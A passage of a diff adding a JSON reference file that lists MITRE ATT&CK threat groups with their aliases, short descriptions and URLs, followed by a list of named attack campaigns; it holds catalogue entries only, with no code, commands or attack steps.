+      "aliases": "Roasted 0ktapus, Octo Tempest, Storm-0875, UNC3944",
+      "desc": "Threat Group Scattered Spider (G1015)",
+      "url": "https://attack.mitre.org/groups/G1015/"
+    },
+    {
+      "id": "G1041",
+      "name": "Sea Turtle",
+      "aliases": "Teal Kurma, Marbled Dust, Cosmic Wolf, SILICON",
+      "desc": "Sea Turtle is a Türkiye-linked threat actor active since at least 2017 performing espionage and service provider compromise operations against victims in Asia, Europe, and North America. Sea ...",
+      "url": "https://attack.mitre.org/groups/G1041/"
+    },
+    {
+      "id": "G1057",
+      "name": "ShinyHunters",
+      "aliases": "UNC6240, Bling Libra",
+      "desc": "Threat Group ShinyHunters (G1057)",
+      "url": "https://attack.mitre.org/groups/G1057/"
+    },
+    {
+      "id": "G1008",
+      "name": "SideCopy",
+      "aliases": "",
+      "desc": "SideCopy is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. SideCopy's name comes from its ...",
+      "url": "https://attack.mitre.org/groups/G1008/"
+    },
+    {
+      "id": "G0121",
+      "name": "Sidewinder",
+      "aliases": "T-APT-04, Rattlesnake",
+      "desc": "Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia ...",
+      "url": "https://attack.mitre.org/groups/G0121/"
+    },
+    {
+      "id": "G0091",
+      "name": "Silence",
+      "aliases": "Whisper Spider",
+      "desc": "Silence is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine ...",
+      "url": "https://attack.mitre.org/groups/G0091/"
+    },
+    {
+      "id": "G0122",
+      "name": "Silent Librarian",
+      "aliases": "TA407, COBALT DICKENS",
+      "desc": "Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of Silent ...",
+      "url": "https://attack.mitre.org/groups/G0122/"
+    },
+    {
+      "id": "G0083",
+      "name": "SilverTerrier",
+      "aliases": "",
+      "desc": "SilverTerrier is a Nigerian threat group that has been seen active since 2014. SilverTerrier mainly targets organizations in high technology, higher education, and manufacturing.",
+      "url": "https://attack.mitre.org/groups/G0083/"
+    },
+    {
+      "id": "G0054",
+      "name": "Sowbug",
+      "aliases": "",
+      "desc": "Sowbug is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015.",
+      "url": "https://attack.mitre.org/groups/G0054/"
+    },
+    {
+      "id": "G1033",
+      "name": "Star Blizzard",
+      "aliases": "SEABORGIUM, Callisto Group, TA446, COLDRIVER",
+      "desc": "Star Blizzard is a cyber espionage and influence group originating in Russia that has been active since at least 2019. Star Blizzard campaigns align closely with Russian state interests and have ...",
+      "url": "https://attack.mitre.org/groups/G1033/"
+    },
+    {
+      "id": "G0038",
+      "name": "Stealth Falcon",
+      "aliases": "",
+      "desc": "Stealth Falcon is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there ...",
+      "url": "https://attack.mitre.org/groups/G0038/"
+    },
+    {
+      "id": "G1053",
+      "name": "Storm-0501",
+      "aliases": "",
+      "desc": "Storm-0501 is a financially motivated cyber criminal group that uses commodity and open-source tools to conduct ransomware operations. Storm-0501 has been active since 2021 and has previously been ...",
+      "url": "https://attack.mitre.org/groups/G1053/"
+    },
+    {
+      "id": "G1046",
+      "name": "Storm-1811",
+      "aliases": "",
+      "desc": "Storm-1811 is a financially-motivated entity linked to Black Basta ransomware deployment. Storm-1811 is notable for unique phishing and social engineering mechanisms for initial access, such as ...",
+      "url": "https://attack.mitre.org/groups/G1046/"
+    },
+    {
+      "id": "G0041",
+      "name": "Strider",
+      "aliases": "ProjectSauron",
+      "desc": "Strider is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.",
+      "url": "https://attack.mitre.org/groups/G0041/"
+    },
+    {
+      "id": "G0039",
+      "name": "Suckfly",
+      "aliases": "",
+      "desc": "Suckfly is a China-based threat group that has been active since at least 2014.",
+      "url": "https://attack.mitre.org/groups/G0039/"
+    },
+    {
+      "id": "G1018",
+      "name": "TA2541",
+      "aliases": "",
+      "desc": "TA2541 is a cybercriminal group that has been targeting the aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 campaigns are typically high ...",
+      "url": "https://attack.mitre.org/groups/G1018/"
+    },
+    {
+      "id": "G0062",
+      "name": "TA459",
+      "aliases": "",
+      "desc": "TA459 is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others.",
+      "url": "https://attack.mitre.org/groups/G0062/"
+    },
+    {
+      "id": "G0092",
+      "name": "TA505",
+      "aliases": "Hive0065, Spandex Tempest, CHIMBORAZO",
+      "desc": "TA505 is a cyber criminal group that has been active since at least 2014. TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware ...",
+      "url": "https://attack.mitre.org/groups/G0092/"
+    },
+    {
+      "id": "G0127",
+      "name": "TA551",
+      "aliases": "GOLD CABIN, Shathak",
+      "desc": "TA551 is a financially-motivated threat group that has been active since at least 2018. The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware ...",
+      "url": "https://attack.mitre.org/groups/G0127/"
+    },
+    {
+      "id": "G1037",
+      "name": "TA577",
+      "aliases": "",
+      "desc": "TA577 is an initial access broker (IAB) that has distributed QakBot and Pikabot, and was among the first observed groups distributing Latrodectus in 2023.",
+      "url": "https://attack.mitre.org/groups/G1037/"
+    },
+    {
+      "id": "G1038",
+      "name": "TA578",
+      "aliases": "",
+      "desc": "TA578 is a threat actor that has used contact forms and email to initiate communications with victims and to distribute malware including Latrodectus, IcedID, and Bumblebee.",
+      "url": "https://attack.mitre.org/groups/G1038/"
+    },
+    {
+      "id": "G1056",
+      "name": "TeamPCP",
+      "aliases": "PCPCat, ShellForce, DeadCatx3, SHADOW-WATER-058, UNC6780",
+      "desc": "TeamPCP is a financially-motivated, cloud-native threat group that has been active since at least September 2025. Initially focused on ransomware and cryptocurrency theft, TeamPCP shifted in early ...",
+      "url": "https://attack.mitre.org/groups/G1056/"
+    },
+    {
+      "id": "G0139",
+      "name": "TeamTNT",
+      "aliases": "",
+      "desc": "TeamTNT is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging ...",
+      "url": "https://attack.mitre.org/groups/G0139/"
+    },
+    {
+      "id": "G0088",
+      "name": "TEMP.Veles",
+      "aliases": "XENOTIME",
+      "desc": "TEMP.Veles is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems.",
+      "url": "https://attack.mitre.org/groups/G0088/"
+    },
+    {
+      "id": "G1058",
+      "name": "The Gentlemen",
+      "aliases": "Storm-2697, GOLD SHERWOOD",
+      "desc": "The Gentlemen is a group that maintains the The Gentlemen Ransomware-as-a-service (RaaS). The Gentlemen was first observed in mid-2025 who had posed The Gentlemen Ransomware as a closed ransomware ...",
+      "url": "https://attack.mitre.org/groups/G1058/"
+    },
+    {
+      "id": "G0089",
+      "name": "The White Company",
+      "aliases": "",
+      "desc": "The White Company is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and ...",
+      "url": "https://attack.mitre.org/groups/G0089/"
+    },
+    {
+      "id": "G0028",
+      "name": "Threat Group-1314",
+      "aliases": "TG-1314",
+      "desc": "Threat Group-1314 is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure.",
+      "url": "https://attack.mitre.org/groups/G0028/"
+    },
+    {
+      "id": "G0027",
+      "name": "Threat Group-3390",
+      "aliases": "Earth Smilodon, TG-3390, Emissary Panda, BRONZE UNION, APT27, Iron Tiger, LuckyMouse, Linen Typhoon",
+      "desc": "Threat Group-3390 is a Chinese threat group that has extensively used strategic Web compromises to target victims. The group has been active since at least 2010 and has targeted organizations in ...",
+      "url": "https://attack.mitre.org/groups/G0027/"
+    },
+    {
+      "id": "G0076",
+      "name": "Thrip",
+      "aliases": "",
+      "desc": "Thrip is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living ...",
+      "url": "https://attack.mitre.org/groups/G0076/"
+    },
+    {
+      "id": "G1022",
+      "name": "ToddyCat",
+      "aliases": "",
+      "desc": "ToddyCat is a sophisticated threat group that has been active since at least 2020 using custom loaders and malware in multi-stage infection chains against government and military targets across ...",
+      "url": "https://attack.mitre.org/groups/G1022/"
+    },
+    {
+      "id": "G0131",
+      "name": "Tonto Team",
+      "aliases": "Earth Akhlut, BRONZE HUNTLEY, CactusPete, Karma Panda",
+      "desc": "Tonto Team is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they ...",
+      "url": "https://attack.mitre.org/groups/G0131/"
+    },
+    {
+      "id": "G0134",
+      "name": "Transparent Tribe",
+      "aliases": "COPPER FIELDSTONE, APT36, Mythic Leopard, ProjectM",
+      "desc": "Transparent Tribe is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan.",
+      "url": "https://attack.mitre.org/groups/G0134/"
+    },
+    {
+      "id": "G0081",
+      "name": "Tropic Trooper",
+      "aliases": "Pirate Panda, KeyBoy",
+      "desc": "Tropic Trooper is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. Tropic Trooper focuses on targeting government, healthcare ...",
+      "url": "https://attack.mitre.org/groups/G0081/"
+    },
+    {
+      "id": "G0010",
+      "name": "Turla",
+      "aliases": "IRON HUNTER, Group 88, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear, Secret Blizzard, BELUGASTURGEON",
+      "desc": "Turla is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB). They have compromised victims in over 50 countries since at least 2004, spanning a ...",
+      "url": "https://attack.mitre.org/groups/G0010/"
+    },
+    {
+      "id": "G1048",
+      "name": "UNC3886",
+      "aliases": "",
+      "desc": "UNC3886 is a China-nexus cyberespionage group that has been active since at least 2022, targeting defense, technology, and telecommunication organizations located in the United States and the Asia ...",
+      "url": "https://attack.mitre.org/groups/G1048/"
+    },
+    {
+      "id": "G1029",
+      "name": "UNC788",
+      "aliases": "",
+      "desc": "UNC788 is a group of hackers from Iran that has targeted people in the Middle East.",
+      "url": "https://attack.mitre.org/groups/G1029/"
+    },
+    {
+      "id": "G1047",
+      "name": "Velvet Ant",
+      "aliases": "",
+      "desc": "Velvet Ant is a threat actor operating since at least 2021. Velvet Ant is associated with complex persistence mechanisms, the targeting of network devices and appliances during operations, and the ...",
+      "url": "https://attack.mitre.org/groups/G1047/"
+    },
+    {
+      "id": "G1055",
+      "name": "VOID MANTICORE",
+      "aliases": "COBALT MYSTIQUE, Handala Hack, Homeland Justice, Karma, Karmabelow80, BANISHED KITTEN, Red Sandstorm",
+      "desc": "Threat Group VOID MANTICORE (G1055)",
+      "url": "https://attack.mitre.org/groups/G1055/"
+    },
+    {
+      "id": "G0123",
+      "name": "Volatile Cedar",
+      "aliases": "Lebanese Cedar",
+      "desc": "Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ...",
+      "url": "https://attack.mitre.org/groups/G0123/"
+    },
+    {
+      "id": "G1017",
+      "name": "Volt Typhoon",
+      "aliases": "BRONZE SILHOUETTE, Vanguard Panda, DEV-0391, UNC3236, Voltzite, Insidious Taurus, DazedToad",
+      "desc": "Threat Group Volt Typhoon (G1017)",
+      "url": "https://attack.mitre.org/groups/G1017/"
+    },
+    {
+      "id": "G1050",
+      "name": "Water Galura",
+      "aliases": "GOLD FEATHER",
+      "desc": "Water Galura are the operators of the Qilin Ransomware-as-a-Service (RaaS) who handle payload generation, ransom negotiations, and the publication of stolen data for Qilin affilates recruited on ...",
+      "url": "https://attack.mitre.org/groups/G1050/"
+    },
+    {
+      "id": "G0107",
+      "name": "Whitefly",
+      "aliases": "",
+      "desc": "Whitefly is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily ...",
+      "url": "https://attack.mitre.org/groups/G0107/"
+    },
+    {
+      "id": "G0124",
+      "name": "Windigo",
+      "aliases": "",
+      "desc": "The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement ...",
+      "url": "https://attack.mitre.org/groups/G0124/"
+    },
+    {
+      "id": "G0112",
+      "name": "Windshift",
+      "aliases": "Bahamut",
+      "desc": "Windshift is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.",
+      "url": "https://attack.mitre.org/groups/G0112/"
+    },
+    {
+      "id": "G0044",
+      "name": "Winnti Group",
+      "aliases": "Blackfly",
+      "desc": "Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its ...",
+      "url": "https://attack.mitre.org/groups/G0044/"
+    },
+    {
+      "id": "G1035",
+      "name": "Winter Vivern",
+      "aliases": "TA473, UAC-0114",
+      "desc": "Winter Vivern is a group linked to Russian and Belorussian interests active since at least 2020 targeting various European government and NGO entities, along with sporadic targeting of Indian and ...",
+      "url": "https://attack.mitre.org/groups/G1035/"
+    },
+    {
+      "id": "G0090",
+      "name": "WIRTE",
+      "aliases": "Ashen Lepus",
+      "desc": "WIRTE is a cyberespionage actor, believed to be a subgroup of the Hamas-affiliated Gaza Cybergang, that has been active since at least August 2018. WIRTE has targeted diplomatic, financial ...",
+      "url": "https://attack.mitre.org/groups/G0090/"
+    },
+    {
+      "id": "G0102",
+      "name": "Wizard Spider",
+      "aliases": "UNC1878, TEMP.MixMaster, Grim Spider, FIN12, GOLD BLACKBURN, ITG23, Periwinkle Tempest, DEV-0193, Pistachio Tempest, DEV-0237",
+      "desc": "Wizard Spider is a Russia-based financially motivated threat group originally known for the creation and deployment of TrickBot since at least 2016. Wizard Spider possesses a diverse arsenal of ...",
+      "url": "https://attack.mitre.org/groups/G0102/"
+    },
+    {
+      "id": "G0128",
+      "name": "ZIRCONIUM",
+      "aliases": "APT31, Violet Typhoon",
+      "desc": "ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the ...",
+      "url": "https://attack.mitre.org/groups/G0128/"
+    }
+  ],
+  "campaigns": [
+    {
+      "id": "C0028",
+      "name": "2015 Ukraine Electric Power Attack",
+      "desc": "2015 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used BlackEnergy (specifically BlackEnergy3) and KillDisk to target and disrupt transmission and distribution ...",
+      "url": "https://attack.mitre.org/campaigns/C0028/"
+    },
+    {
+      "id": "C0025",
+      "name": "2016 Ukraine Electric Power Attack",
+      "desc": "2016 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used Industroyer malware to target and disrupt distribution substations within the Ukrainian power grid. This ...",
+      "url": "https://attack.mitre.org/campaigns/C0025/"
+    },
+    {
+      "id": "C0034",
+      "name": "2022 Ukraine Electric Power Attack",
+      "desc": "The 2022 Ukraine Electric Power Attack was a Sandworm Team campaign that used a combination of GOGETTER, Neo-REGEORG, CaddyWiper, and living of the land (LotL) techniques to gain access to a ...",
+      "url": "https://attack.mitre.org/campaigns/C0034/"
+    },
+    {
+      "id": "C0063",
+      "name": "2025 Poland Wiper Attacks",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0063/"
+    },
+    {
+      "id": "C0066",
+      "name": "2026 U.S. Water Utilities Attacks",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0066/"
+    },
+    {
+      "id": "C0057",
+      "name": "3CX Supply Chain Attack",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0057/"
+    },
+    {
+      "id": "C0064",
+      "name": "AI-Assisted Breach of Mexico's Government Infrastructure",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0064/"
+    },
+    {
+      "id": "C0062",
+      "name": "Anthropic AI-orchestrated Campaign",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0062/"
+    },
+    {
+      "id": "C0051",
+      "name": "APT28 Nearest Neighbor Campaign",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0051/"
+    },
+    {
+      "id": "C0040",
+      "name": "APT41 DUST",
+      "desc": "APT41 DUST was conducted by APT41 from 2023 to July 2024 against entities in Europe, Asia, and the Middle East. APT41 DUST targeted sectors such as shipping, logistics, and media for information ...",
+      "url": "https://attack.mitre.org/campaigns/C0040/"
+    },
+    {
+      "id": "C0046",
+      "name": "ArcaneDoor",
+      "desc": "ArcaneDoor is a campaign targeting networking devices from Cisco and other vendors between July 2023 and April 2024, primarily focused on government and critical infrastructure networks ...",
+      "url": "https://attack.mitre.org/campaigns/C0046/"
+    },
+    {
+      "id": "C0010",
+      "name": "C0010",
+      "desc": "C0010 was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts ...",
+      "url": "https://attack.mitre.org/campaigns/C0010/"
+    },
+    {
+      "id": "C0011",
+      "name": "C0011",
+      "desc": "C0011 was a suspected cyber espionage campaign conducted by Transparent Tribe that targeted students at universities and colleges in India. Security researchers noted this campaign against ...",
+      "url": "https://attack.mitre.org/campaigns/C0011/"
+    },
+    {
+      "id": "C0015",
+      "name": "C0015",
+      "desc": "C0015 was a ransomware intrusion during which the unidentified attackers used Bazar, Cobalt Strike, and Conti, along with other tools, over a 5 day period. Security researchers assessed the actors ...",
+      "url": "https://attack.mitre.org/campaigns/C0015/"
+    },
+    {
+      "id": "C0017",
+      "name": "C0017",
+      "desc": "C0017 was an APT41 campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet ...",
+      "url": "https://attack.mitre.org/campaigns/C0017/"
+    },
+    {
+      "id": "C0018",
+      "name": "C0018",
+      "desc": "C0018 was a month-long ransomware intrusion that successfully deployed AvosLocker onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed ...",
+      "url": "https://attack.mitre.org/campaigns/C0018/"
+    },
+    {
+      "id": "C0021",
+      "name": "C0021",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0021/"
+    },
+    {
+      "id": "C0026",
+      "name": "C0026",
+      "desc": "C0026 was a campaign identified in September 2022 that included the selective distribution of KOPILUWAK and QUIETCANARY malware to previous ANDROMEDA malware victims in Ukraine through re ...",
+      "url": "https://attack.mitre.org/campaigns/C0026/"
+    },
+    {
+      "id": "C0027",
+      "name": "C0027",
+      "desc": "C0027 was a financially-motivated campaign linked to Scattered Spider that targeted telecommunications and business process outsourcing (BPO) companies from at least June through December of 2022 ...",
+      "url": "https://attack.mitre.org/campaigns/C0027/"
+    },
+    {
+      "id": "C0032",
+      "name": "C0032",
+      "desc": "C0032 was an extended campaign suspected to involve the Triton adversaries with related capabilities and techniques focused on gaining a foothold within IT environments. This campaign occurred in ...",
+      "url": "https://attack.mitre.org/campaigns/C0032/"
+    },
+    {
+      "id": "C0033",
+      "name": "C0033",
+      "desc": "C0033 was a PROMETHIUM campaign during which they used StrongPity to target Android users. C0033 was the first publicly documented mobile campaign for PROMETHIUM, who previously used Windows-based ...",
+      "url": "https://attack.mitre.org/campaigns/C0033/"
+    },
+    {
+      "id": "C0004",
+      "name": "CostaRicto",
+      "desc": "CostaRicto was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. CostaRicto actors targeted ...",
+      "url": "https://attack.mitre.org/campaigns/C0004/"
+    },
+    {
+      "id": "C0029",
+      "name": "Cutting Edge",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0029/"
+    },
+    {
+      "id": "C0053",
+      "name": "FLORAHOX Activity",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0053/"
+    },
+    {
+      "id": "C0001",
+      "name": "Frankenstein",
+      "desc": "Frankenstein was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors ...",
+      "url": "https://attack.mitre.org/campaigns/C0001/"
+    },
+    {
+      "id": "C0041",
+      "name": "FrostyGoop Incident",
+      "desc": "FrostyGoop Incident took place in January 2024 against a municipal district heating company in Ukraine. Following initial access via likely exploitation of external facing services, FrostyGoop was ...",
+      "url": "https://attack.mitre.org/campaigns/C0041/"
+    },
+    {
+      "id": "C0007",
+      "name": "FunnyDream",
+      "desc": "FunnyDream was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia ...",
+      "url": "https://attack.mitre.org/campaigns/C0007/"
+    },
+    {
+      "id": "C0038",
+      "name": "HomeLand Justice",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0038/"
+    },
+    {
+      "id": "C0043",
+      "name": "Indian Critical Infrastructure Intrusions",
+      "desc": "Indian Critical Infrastructure Intrusions is a sequence of intrusions from 2021 through early 2022 linked to People's Republic of China (PRC) threat actors, particularly RedEcho and Threat ...",
+      "url": "https://attack.mitre.org/campaigns/C0043/"
+    },
+    {
+      "id": "C0050",
+      "name": "J-magic Campaign",
+      "desc": "The J-magic Campaign was active from mid-2023 to at least mid-2024 and featured the use of the J-magic backdoor, a custom cd00r variant tailored for use against Juniper routers. The J-magic ...",
+      "url": "https://attack.mitre.org/campaigns/C0050/"
+    },
+    {
+      "id": "C0044",
+      "name": "Juicy Mix",
+      "desc": "Juicy Mix was a campaign conducted by OilRig throughout 2022 that targeted Israeli organizations with the Mango backdoor.",
+      "url": "https://attack.mitre.org/campaigns/C0044/"
+    },
+    {
+      "id": "C0035",
+      "name": "KV Botnet Activity",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0035/"
+    },
+    {
+      "id": "C0049",
+      "name": "Leviathan Australian Intrusions",
+      "desc": "Leviathan Australian Intrusions consisted of at least two long-term intrusions against victims in Australia by Leviathan, relying on similar tradecraft such as external service exploitation ...",
+      "url": "https://attack.mitre.org/campaigns/C0049/"
+    },
+    {
+      "id": "C0020",
+      "name": "Maroochy Water Breach",
+      "desc": "Maroochy Water Breach was an incident in 2000 where an adversary leveraged the local government's wastewater control system and stolen engineering equipment to disrupt and eventually release ...",
+      "url": "https://attack.mitre.org/campaigns/C0020/"
+    },
+    {
+      "id": "C0002",
+      "name": "Night Dragon",
+      "desc": "Night Dragon was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The ...",
+      "url": "https://attack.mitre.org/campaigns/C0002/"
+    },
+    {
+      "id": "C0060",
+      "name": "Operation AkaiRyū",
+      "desc": "Operation AkaiRyū (Japanese for RedDragon) was a cyberespionage spearphishing campaign conducted by MirrorFace between June and September 2024 against entities in Japan and Central Europe ...",
+      "url": "https://attack.mitre.org/campaigns/C0060/"
+    },
+    {
+      "id": "C0012",
+      "name": "Operation CuckooBees",
+      "desc": "Operation CuckooBees was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted ...",
+      "url": "https://attack.mitre.org/campaigns/C0012/"
+    },
+    {
+      "id": "C0061",
+      "name": "Operation Digital Eye",
+      "desc": "Operation Digital Eye was conducted in June and July of 2024 by suspected People's Republic of China (PRC)-nexus threat actors targeting business-to-business IT service providers in Southern ...",
+      "url": "https://attack.mitre.org/campaigns/C0061/"
+    },
+    {
+      "id": "C0022",
+      "name": "Operation Dream Job",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0022/"
+    },
+    {
+      "id": "C0016",
+      "name": "Operation Dust Storm",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0016/"
+    },
+    {
+      "id": "C0023",
+      "name": "Operation Ghost",
+      "desc": "Operation Ghost was an APT29 campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During ...",
+      "url": "https://attack.mitre.org/campaigns/C0023/"
+    },
+    {
+      "id": "C0006",
+      "name": "Operation Honeybee",
+      "desc": "Operation Honeybee was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. Operation Honeybee initially targeted South ...",
+      "url": "https://attack.mitre.org/campaigns/C0006/"
+    },
+    {
+      "id": "C0048",
+      "name": "Operation MidnightEclipse",
+      "desc": "Operation MidnightEclipse was a campaign conducted in March and April 2024 that involved initial exploit of zero-day vulnerability CVE-2024-3400, a critical command injection vulnerability in the ...",
+      "url": "https://attack.mitre.org/campaigns/C0048/"
+    },
+    {
+      "id": "C0013",
+      "name": "Operation Sharpshooter",
+      "desc": "Operation Sharpshooter was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom ...",
+      "url": "https://attack.mitre.org/campaigns/C0013/"
+    },
+    {
+      "id": "C0005",
+      "name": "Operation Spalax",
+      "desc": "Operation Spalax was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The ...",
+      "url": "https://attack.mitre.org/campaigns/C0005/"
+    },
+    {
+      "id": "C0054",
+      "name": "Operation Triangulation",
+      "desc": "Operation Triangulation is a mobile campaign targeting iOS devices. The unidentified actors used zero-click exploits in iMessage attachments to gain Initial Access, then executed exploits and ...",
+      "url": "https://attack.mitre.org/campaigns/C0054/"
+    },
+    {
+      "id": "C0014",
+      "name": "Operation Wocao",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0014/"
+    },
+    {
+      "id": "C0042",
+      "name": "Outer Space",
+      "desc": "Outer Space was a campaign conducted by OilRig throughout 2021 that used the SampleCheck5000 downloader and Solar backdoor to target Israeli organizations.",
+      "url": "https://attack.mitre.org/campaigns/C0042/"
+    },
+    {
+      "id": "C0036",
+      "name": "Pikabot Distribution February 2024",
+      "desc": "Pikabot was distributed in Pikabot Distribution February 2024 using malicious emails with embedded links leading to malicious ZIP archives requiring user interaction for follow-on infection. The ...",
+      "url": "https://attack.mitre.org/campaigns/C0036/"
+    },
+    {
+      "id": "C0055",
+      "name": "Quad7 Activity",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0055/"
+    },
+    {
+      "id": "C0047",
+      "name": "RedDelta Modified PlugX Infection Chain Operations",
+      "desc": "RedDelta Modified PlugX Infection Chain Operations was executed by Mustang Panda from mid-2023 through the end of 2024 against multiple entities in East and Southeast Asia. RedDelta Modified PlugX ...",
+      "url": "https://attack.mitre.org/campaigns/C0047/"
+    },
+    {
+      "id": "C0056",
+      "name": "RedPenguin",
+      "desc": "The RedPenguin project was launched by Juniper in July 2024 to investigate reported malware infections of Juniper MX Series routers. RedPenguin activity was separately attributed to UNC3886 and ...",
+      "url": "https://attack.mitre.org/campaigns/C0056/"
+    },
+    {
+      "id": "C0059",
+      "name": "Salesforce Data Exfiltration",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0059/"
+    },
+    {
+      "id": "C0045",
+      "name": "ShadowRay",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0045/"
+    },
+    {
+      "id": "C0058",
+      "name": "SharePoint ToolShell Exploitation",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0058/"
+    },
+    {
+      "id": "C0024",
+      "name": "SolarWinds Compromise",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0024/"
+    },
+    {
+      "id": "C0052",
+      "name": "SPACEHOP Activity",
+      "desc": "SPACEHOP Activity is conducted through commercially leased Virtual Private Servers (VPS), otherwise known as provisioned Operational Relay Box (ORB) networks. The network leveraged for SPACEHOP ...",
+      "url": "https://attack.mitre.org/campaigns/C0052/"
+    },
+    {
+      "id": "C0030",
+      "name": "Triton Safety Instrumented System Attack",
+      "desc": "Triton Safety Instrumented System Attack was a campaign employed by TEMP.Veles which leveraged the Triton malware framework against a petrochemical organization. The malware and techniques used ...",
+      "url": "https://attack.mitre.org/campaigns/C0030/"
+    },
+    {
+      "id": "C0031",
+      "name": "Unitronics Defacement Campaign",
+      "desc": "The Unitronics Defacement Campaign was a collection of intrusions across multiple sectors by the CyberAv3ngers, where threat actors engaged in a seemingly opportunistic and global targeting and ...",
+      "url": "https://attack.mitre.org/campaigns/C0031/"
+    },
+    {
+      "id": "C0039",
+      "name": "Versa Director Zero Day Exploitation",
+      "desc": "",
+      "url": "https://attack.mitre.org/campaigns/C0039/"
+    },
+    {
+      "id": "C0037",
+      "name": "Water Curupira Pikabot Distribution",
+      "desc": "Pikabot was distributed in Water Curupira Pikabot Distribution throughout 2023 by an entity linked to BlackBasta ransomware deployment via email attachments. This activity followed the take-down ...",
+      "url": "https://attack.mitre.org/campaigns/C0037/"
+    }
+  ]
+}
